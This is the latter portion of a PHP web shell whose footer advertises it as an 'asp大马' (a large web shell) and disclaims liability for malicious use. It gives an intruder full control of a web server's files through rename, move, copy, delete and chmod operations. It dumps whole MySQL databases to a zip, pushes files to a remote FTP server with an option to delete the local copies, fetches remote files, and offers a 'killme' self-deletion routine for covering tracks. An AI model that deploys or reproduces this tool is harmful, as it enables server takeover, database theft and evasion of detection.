        }else{
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "<span class='error'>您的文件 ".$ndir.$nfname." 不能被创建。请检查您的目录权限是否已经被设置为可写 或者 文件是否已经存在</span>\n";
        }
    }
    mainbottom();
    }else{
    cr();
    }
}
function ren($file) {
    global $meurl,$folder,$ufolder;
    $ufile = $file;
    if (!$file == "") {
        maintop("重命名");
        echo "<form action=\"".$meurl."?op=rename\" method=\"post\">\n"
            ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
            ."重命名 ".$ufolder.$ufile;
        echo "</table><br>\n"
            ."<input type=\"hidden\" name=\"rename\" value=\"".$ufile."\">\n"
            ."<input type=\"hidden\" name=\"folder\" value=\"".$ufolder."\">\n"
            ."新文件名:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nrename\" value=\"$ufile\">\n"
            ."<input type=\"Submit\" value=\"重命名\" class=\"button\"></form>\n";
        mainbottom();
    }else{
        home();
    }
}
function renam($rename, $nrename, $folder) {
    global $meurl,$folder;
    if (!$rename == "") {
        $loc1 = iconv("UTF-8", "GBK", "$folder".$rename); 
        $loc2 = iconv("UTF-8", "GBK", "$folder".$nrename);
        if(rename($loc1,$loc2)) {
        maintop("重命名");
            echo "文件 ".$folder.$rename." 已被重命名成 ".$folder.$nrename."</a>\n"
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
            mainbottom();
        }else{
            printerror("重命名出错！");
        }
    }else{
    home();
    }
}
function movall($file, $ndir, $folder) {
    global $meurl,$folder;
    if (!$file == "") {
        maintop("批量移动");
        $arr = str_split($ndir);
        if($arr[count($arr)-1]!=='/'){
            $ndir .= '/';
        }
        $nndir = $ndir;
        $nfolder = $folder;
    $file = iconv("UTF-8", "GBK",$file);
    $ndir = iconv("UTF-8", "GBK",$ndir);
    $folder = iconv("UTF-8", "GBK",$folder);
        if (!file_exists($ndir)){
        mkdir($ndir, 0755);
        }
        $file = explode(',',$file);
        foreach ($file as $v) {
        if (file_exists($ndir.$v)){
        @unlink($ndir.$v);
        if (@rename($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nndir.$v." 文件被 ".$nfolder.$v." 替换<br>";
            }else{
            $v = iconv("GBK", "UTF-8",$v);
                echo "<span class='error'>无法移动 ".$nfolder.$v.'，请检查文件权限</span><br>';
            }
        }elseif (@rename($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nfolder.$v." 已经成功移动到 ".$nndir.$v.'<br>';
        }else{
        $v = iconv("GBK", "UTF-8",$v);
            echo "<span class='error'>无法移动 ".$nfolder.$v.'，请检查文件权限</span><br>';
        }
        }
    echo "你可以 <a href=\"".$meurl."?op=home&folder=".$nndir."\">前往文件夹查看文件</a> 或者 <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
    mainbottom();
    }else{
    home();
    }
}
function tocopy($file, $ndir, $folder) {
    global $meurl,$folder;
    if (!$file == "") {
        maintop("复制");
        $nndir = $ndir;
        $nfolder = $folder;
    $file = iconv("UTF-8", "GBK",$file);
    $ndir = iconv("UTF-8", "GBK",$ndir);
    $folder = iconv("UTF-8", "GBK",$folder);
        if (!file_exists($ndir)){
        mkdir($ndir, 0755);
        }
        $file = explode(',',$file);
        foreach ($file as $v) {
        if (file_exists($ndir.$v)){
        @unlink($ndir.$v);
        if (@copy($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nndir.$v." 文件被 ".$nfolder.$v." 替换<br>";
            }else{
            $v = iconv("GBK", "UTF-8",$v);
                echo "<span class='error'>无法复制 ".$nfolder.$v.'，请检查文件权限</span><br>';
            }
        }elseif (@copy($folder.$v, $ndir.$v)){
        $v = iconv("GBK", "UTF-8",$v);
            echo $nfolder.$v." 已经成功复制到 ".$nndir.$v.'<br>';
        }else{
        $v = iconv("GBK", "UTF-8",$v);
            echo "<span class='error'>无法复制 ".$nfolder.$v.'，请检查文件权限</span><br>';
        }
        }
    echo "你可以 <a href=\"".$meurl."?op=home&folder=".$nndir."\">前往文件夹查看文件</a> 或者 <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
    mainbottom();
    }else{
    home();
    }
}
/****************************************************************/
/* function logout()                                            */
/*                                                              */
/* Logs the user out and kills cookies                          */
/****************************************************************/
function logout() {
    global $meurl,$login;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);
    maintop("退出",false);
    echo "你已经退出."
        ."<br><br>"
        ."<a href=".$meurl."?op=home>点击这里重新登录.</a>";
    mainbottom();
}
/****************************************************************/
/* function mainbottom()                                        */
/*                                                              */
/* 页面底部的版权声明                                           */
/****************************************************************/
function mainbottom() {
    echo "</table></table>\n"
        ."\n<div style='text-align:center'>"
        ."asp大马官网：www.asp-muma.com 提供。恶意使用本程序所产生的法律后果与本人无关！ \n"
        ."</html>\n";
    exit;
}
/****************************************************************/
/* function sqlb()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/
function sqlb() {
global $meurl;
    maintop("数据库备份");
    echo @$content 
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><span class='error'>**警告: 这将进行数据库导出并压缩成mysql.zip的动作! 如存在该文件,该文件将被覆盖!**</span><br><br><form action=\"".$meurl."?op=sqlbackup\" method=\"POST\">\n<label for=\"ip\">数据库地址:  </label><input id=\"ip\" name=\"ip\" size=\"30\" class=\"text\"/><br><label for=\"sql\">数据库名称:  </label><input id=\"sql\" name=\"sql\" size=\"30\" class=\"text\"/><br><label for=\"username\">数据库用户:  </label><input id=\"username\" name=\"username\" size=\"30\" class=\"text\"/><br><label for=\"password\">数据库密码:  </label><input id=\"password\" name=\"password\" size=\"30\" class=\"text\"/><br>数据库编码:  <select id=\"chset\"><option id=\utf8\">utf8</option></select><br><input name=\"submit\" class=\"button\" value=\"备份\" type=\"submit\" /></form>\n";
    mainbottom();
}
/****************************************************************/
/* function sqlbackup()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function sqlbackup($ip,$sql,$username,$password) {
global $meurl;
    if(class_exists('ZipArchive')){
    maintop("数据库备份");
    $database=$sql;//数据库名
    $options=array(
        'hostname' => $ip,//ip地址
        'charset' => 'utf8',//编码
        'filename' => $database.'.sql',//文件名
        'username' => $username,
        'password' => $password
    );
    mysql_connect($options['hostname'],$options['username'],$options['password'])or die("不能连接数据库!");
    mysql_select_db($database) or die("数据库名称错误!");
    mysql_query("SET NAMES '{$options['charset']}'");
    $tables = list_tables($database);
    $filename = sprintf($options['filename'],$database);
    $fp = fopen($filename, 'w');
    foreach ($tables as $table) {
        dump_table($table, $fp);
    }
    fclose($fp);
    //压缩sql文件
        if (file_exists('mysql.zip')) {
            unlink('mysql.zip'); 
        }
        $file_name=$options['filename'];
        $zip = new ZipArchive;
        $res = $zip->open('mysql.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
            $zip->addfile($file_name);
            $zip->close();
        //删除服务器上的sql文件
            unlink($file_name);
        echo '数据库导出并压缩完成！'
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        }else{
            printerror('无法压缩文件！');
        }
    exit;
    mainbottom();
    }else{
    printerror('此服务器上的PHP不支持ZipArchive，无法压缩文件！');
    }
}
function list_tables($database)
{
    $rs = mysql_query("SHOW TABLES FROM $database");
    $tables = array();
    while ($row = mysql_fetch_row($rs)) {
        $tables[] = $row[0];
    }
    mysql_free_result($rs);
    return $tables;
}
//导出数据库
function dump_table($table, $fp = null)
{
    $need_close = false;
    if (is_null($fp)) {
        $fp = fopen($table . '.sql', 'w');
        $need_close = true;
    }
$a=mysql_query("show create table `{$table}`");
$row=mysql_fetch_assoc($a);fwrite($fp,$row['Create Table'].';');//导出表结构
    $rs = mysql_query("SELECT * FROM `{$table}`");
    while ($row = mysql_fetch_row($rs)) {
        fwrite($fp, get_insert_sql($table, $row));
    }
    mysql_free_result($rs);
    if ($need_close) {
        fclose($fp);
    }
}
//导出表数据
function get_insert_sql($table, $row)
{
    $sql = "INSERT INTO `{$table}` VALUES (";
    $values = array();
    foreach ($row as $value) {
        $values[] = "'" . mysql_real_escape_string($value) . "'";
    }
    $sql .= implode(', ', $values) . ");";
    return $sql;
}
function killme($dename) {
    global $folder;
    if (!$dename == "") {
        if(unlink($folder.$dename)) {
        maintop("自杀");
            echo "自杀成功！ "
                ." <a href=".$folder.">返回网站首页</a>\n";
            mainbottom();
        }else{
            printerror("自杀失败，请检查文件权限！");
        }    }else{
        home();
    }
}
/****************************************************************/
/* function ftpa()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/
function ftpa() {
global $meurl;
    maintop("FTP备份");
    echo @$content
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><span class='error'>**警告: 这将把文件远程上传到其他ftp! 如目录存在该文件,文件将被覆盖!**</span><br><br><form action=\"".$meurl."?op=ftpall\" method=\"POST\"><label for=\"ftpip\">FTP 地址:  </label><input id=\"ftpip\" name=\"ftpip\" size=\"30\" class=\"text\" value=\"127.0.0.1:21\"/><br><label for=\"ftpuser\">FTP 用户:  </label><input id=\"ftpuser\" name=\"ftpuser\" size=\"30\" class=\"text\"/><br><label for=\"ftppass\">FTP 密码:  </label><input id=\"ftppass\" name=\"ftppass\" size=\"30\" class=\"text\"/><br><label for=\"goto\">上传目录:  </label><input id=\"goto\" name=\"goto\" size=\"30\" class=\"text\" value=\"./htdocs/\"/><br><label for=\"ftpfile\">上传文件:  </label><input id=\"ftpfile\" name=\"ftpfile\" size=\"30\" class=\"text\" value=\"allbackup.zip\"/><br><input name=\"submit\" class=\"button\" value=\"远程上传\" type=\"submit\" /><input type=\"checkbox\" name=\"del\" id=\"del\"value=\"checkbox\"><label for=\"del\"><abbr title='FTP上传后删除本地文件'>删除</abbr></label></form>\n";
    mainbottom();
}
/****************************************************************/
/* function ftpall()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function ftpall($ftpip,$ftpuser,$ftppass,$ftpdir,$ftpfile,$del) {
global $meurl;
$ftpfile = iconv("UTF-8", "GBK", $ftpfile);
    maintop("FTP上传");
    $ftpip=explode(':', $ftpip);
    $ftp_server=$ftpip['0'];//服务器
    $ftp_user_name=$ftpuser;//用户名
    $ftp_user_pass=$ftppass;//密码
    if(empty($ftpip['1'])){
    $ftp_port='21';
    }else{
    $ftp_port=$ftpip['1'];//端口
    }
    $ftp_put_dir=$ftpdir;//上传目录
    $ffile=$ftpfile;//上传文件
    $ftp_conn_id = ftp_connect($ftp_server,$ftp_port);
    $ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);
    if((!$ftp_conn_id) || (!$ftp_login_result)) {
        echo "连接到ftp服务器失败";
        exit;
    }else{
        ftp_pasv ($ftp_conn_id,true); //返回一下模式，这句很奇怪，有些ftp服务器一定需要执行这句
        ftp_chdir($ftp_conn_id, $ftp_put_dir);
        $ffile=explode(',', $ffile);
        foreach ($ffile as $v) {
        $ftp_upload = ftp_put($ftp_conn_id,$v,$v, FTP_BINARY);
        if ($del == 'del') {
        unlink('./'.$v);
        }
        }
        ftp_close($ftp_conn_id); //断开
    }
    $ftpfile = iconv("GBK", "UTF-8", $ftpfile);
    echo "文件 ".$ftpfile." 上传成功\n"
        ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
    mainbottom();
}
/****************************************************************/
/* function printerror()                                        */
/*                                                              */
/* 用于显示错误信息的函数                                       */
/* $error为显示的提示                                           */
/****************************************************************/
function printerror($error) {
    maintop("错误");
    echo "<span class=error>\n".$error."\n</span>"
        ." <a onclick=\"history.go(-1);\" style=\"cursor:pointer\">返回上一步</a>\n";
    mainbottom();
}
/****************************************************************/
/* function deleteall()                                         */
/*                                                              */
/* 2014-3-9 Add by Jooies                                       */
/* 实现文件的批量删除功能                                       */
/****************************************************************/
function deleteall($dename) {
    if (!$dename == "") {
    $udename = $dename;
    $dename = iconv("UTF-8", "GBK",$dename);
        if (is_dir($dename)) {
            if(is_empty_dir($dename)){ 
                rmdir($dename);
                echo "<span>".$udename." 已经被删除</span><br>";
            }else{
                deltree($dename);
                rmdir($dename);
                echo "<span>".$udename." 已经被删除</span><br>";
            }
        }else{
            if(@unlink($dename)) {
                echo '<span>'.$udename." 已经被删除</span><br>";
            }else{
                echo("<span class='error'>无法删除文件：$udename ，可能是文件不存在！</span><br>");
            }
        }
    }
}
if(@$_POST['action']=='删除'){
    if(isset($_POST['select_item'])){
    maintop("删除");
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $val){
                deleteall($val);
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $val){
                if(deleteall($val)){}
            }
        }
        echo "<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
}
if(@$_POST['action']=='移动'){
    if(isset($_POST['select_item'])){
    maintop("批量移动");
    $file = '';
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        $file = substr($file,0,-1);
    echo "<form action=\"".$meurl."?op=movall\" method=\"post\">";
    echo '<input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">您将把下列文件移动到：'
        ."<input type=\"text\" class=\"text\" name=\"ndir\" value=\"".$_SESSION['folder']."\"><br>\n"
        .$file;
        echo "<br><input type=\"submit\" value=\"移动\" border=\"0\" class=\"button\"> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
}
if(@$_POST['action']=='复制'){
    if(isset($_POST['select_item'])){
    maintop("复制");
    $file = '';
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $key => $val){
                $file = $file.$key.',';
            }
        }
        $file = substr($file,0,-1);
    echo "<form action=\"".$meurl."?op=copy\" method=\"post\">";
    echo '<input type="hidden" name="file" value="'.$file.'"><input type="hidden" name="folder" value="'.$_SESSION['folder'].'">您将把下列文件复制到：'
        ."<input type=\"text\" class=\"text\" name=\"ndir\" value=\"".$_SESSION['folder']."\"><br>\n"
        .$file;
        echo "<br><input type=\"submit\" value=\"复制\" border=\"0\" class=\"button\"> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
}
if(@$_POST['action']=='压缩'){
    if(isset($_POST['select_item'])){
    if(class_exists('ZipArchive')){
    maintop("目录压缩");
        class Zipper extends ZipArchive {
            public function addDir($path) {
                if(@$_POST['select_item']['d']){
                    foreach($_POST['select_item']['d'] as $key => $val){
                    $val = substr($val,2);
                    $val = iconv("UTF-8", "GBK",$val);
                    $this->addDir2($val);
                    }
                }
                if(@$_POST['select_item']['f']){
                    foreach($_POST['select_item']['f'] as $key => $val){
                    $val = substr($val,2);
                    echo $val.'<br>';
                        $this->addFile($val);
                    }
                    $this->deleteName('./');
                }
            }
            public function addDir2($path) {
                $nval = iconv("GBK", "UTF-8",$path);
                echo $nval.'<br>';
                $this->addEmptyDir($path);
                $dr = opendir($path);
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                if($file!=='.' && $file!=='..'){
                    $nodes[$i] = $path.'/'.$file;
                    $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                $nnode = iconv("GBK", "UTF-8",$node);
                    echo $nnode . '<br>';
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
        }
        $zip = new Zipper;
        $time = date('D-d-M-g-h',$_SERVER['REQUEST_TIME']);
        $res = $zip->open($_SESSION['folder'].'Backup-'.$time.'.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
        $f = substr($_SESSION['folder'], 0, -1);
            $zip->addDir($f);
            $zip->close();
            echo "压缩完成 文件保存为Backup-".$time.".zip<br>你可以 <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">查看文件夹</a> 或者 <a href=\"".$meurl."?op=home\">返回文件管理</a>\n";
        }else{
            echo '<span class="error">压缩失败！</span>'
                ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        }
        mainbottom();
    }else{
    printerror('此服务器上的PHP不支持ZipArchive，无法压缩文件！');
    }
    }else{
        printerror("您没有选择文件");
    }
}
if(@$_POST['action']=='权限'){
    if(isset($_POST['select_item'])){
    maintop("修改权限");
    $chmod = octdec($_REQUEST['chmod']);
        function ChmodMine($file, $chmod)
        {
        $nfile = $file;
        $file = iconv("UTF-8", "GBK",$file);
        if(is_file($file)){
                if(@chmod($file, $chmod)){
                echo $nfile.' 权限修改成功<br>';
                }else{
                echo '<span class="error">'.$nfile.' 权限修改失败</span><br>';
                }
        }elseif(is_dir($file)){
                if(@chmod($file, $chmod)){
                echo $nfile.' 权限修改成功<br>';
                }else{
                echo '<span class="error">'.$nfile.' 权限修改失败</span><br>';
                }
        $foldersAndFiles = @scandir($file);
        $entries = @array_slice($foldersAndFiles, 2);
        foreach($entries as $entry){
        $nentry = iconv("GBK", "UTF-8",$entry);
        ChmodMine($nfile.'/'.$nentry, $chmod);
        }
        }else{
        echo '<span class="error">'.$nfile.' 文件不存在！</span><br>';
        }
        }
        if(@$_POST['select_item']['d']){
            foreach($_POST['select_item']['d'] as $val){
                ChmodMine($val,$chmod);
            }
        }
        if(@$_POST['select_item']['f']){
            foreach($_POST['select_item']['f'] as $val){
                ChmodMine($val,$chmod);
            }
        }
        echo "<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件");
    }
}
/****************************************************************/
/* function switch()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $op() and switches to it                            *.
/****************************************************************/
switch($op) {
    case "home":
    home();
    break;
    case "up":
    up();
    break;
    case "yupload":
    if(!isset($_REQUEST['url'])){
    printerror('您没有输入文件地址！');
    }elseif(isset($_REQUEST['ndir'])){
        yupload($_REQUEST['url'], $_REQUEST['ndir'], @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }else{
    yupload($_REQUEST['url'], './', @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }
    break;
    case "upload":
    if(!isset($_FILES['upfile'])){
    printerror('您没有选择文件！');
    }elseif(isset($_REQUEST['ndir'])){
        upload($_FILES['upfile'], $_REQUEST['ndir'], @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }else{
    upload($_FILES['upfile'], './', @$_REQUEST['unzip'] ,@$_REQUEST['delzip']);
    }
    break;
    case "unz":
    unz($_REQUEST['dename']);
    break;
    case "unzip":
    unzip($_REQUEST['dename'],$_REQUEST['ndir'],@$_REQUEST['del']);
    break;
    case "sqlb":
    sqlb();
    break;
    case "sqlbackup":
    sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);
    break;
    case "ftpa":
    ftpa();
    break;
    case "ftpall":
    ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto'], $_POST['ftpfile'], $_POST['del']);
    break;
    case "allz":
    allz();
    break;
    case "allzip":
    allzip();
    break;
    case "edit":
    edit($_REQUEST['fename']);
    break;
    case "save":
    save($_REQUEST['ncontent'], $_REQUEST['fename'], $_REQUEST['encode']);
    break;
    case "cr":
    cr();
    break;
    case "create":
    create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
    break;
    case "ren":
    ren($_REQUEST['file']);
    break;
    case "rename":
    renam($_REQUEST['rename'], $_REQUEST['nrename'], $folder);
    break;
    case "movall":
    movall(@$_REQUEST['file'], @$_REQUEST['ndir'], $folder);
    break;
    case "copy":
    tocopy(@$_REQUEST['file'], @$_REQUEST['ndir'], $folder);
    break;
    case "printerror":
    printerror($error);
    break;
    case "logout":
    logout();
    break;   
    case "z":
    z($_REQUEST['dename'],$_REQUEST['folder']);
    break;
    case "zip":
    zip($_REQUEST['dename'],$_REQUEST['folder']);
    break;
    case "killme":
    killme($_REQUEST['dename']);
    break;
    default:
    home();
    break;
}
?>